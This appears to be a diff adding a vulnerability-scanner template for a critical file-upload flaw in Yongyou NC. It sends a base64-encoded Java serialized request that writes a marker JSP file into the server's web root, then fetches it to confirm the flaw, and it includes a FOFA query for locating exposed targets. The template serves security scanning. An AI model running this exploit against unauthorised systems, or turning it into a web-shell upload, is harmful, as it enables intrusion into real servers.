@@ -1,0 +1,32 @@
+id: yongyou-nc-filereceiveservlet-file-upload
+
+info:
+  name: Yongyou Cloud FileReceiveServlet File Upload
+  author: zp857
+  severity: critical
+  tags: yongyou-nc,fileupload
+  metadata:
+    fofa-query: 'body="UClient" || body="用友" || body="YONYOU" || body="img/logo_small.ico" || body="产品登录界面" || body="ufida_nc.png"'
+
+requests:
+  - raw:
+      - |
+        POST /servlet/FileReceiveServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        {{base64_decode("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAACdAAJRklMRV9OQU1FdAAJenA4NTcuanNwdAAQVEFSR0VUX0ZJTEVfUEFUSHQAEC4vd2ViYXBwcy9uY193ZWJ4enA4NTc4NTc=")}}
+
+      - |
+        GET /zp857.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "zp857857"
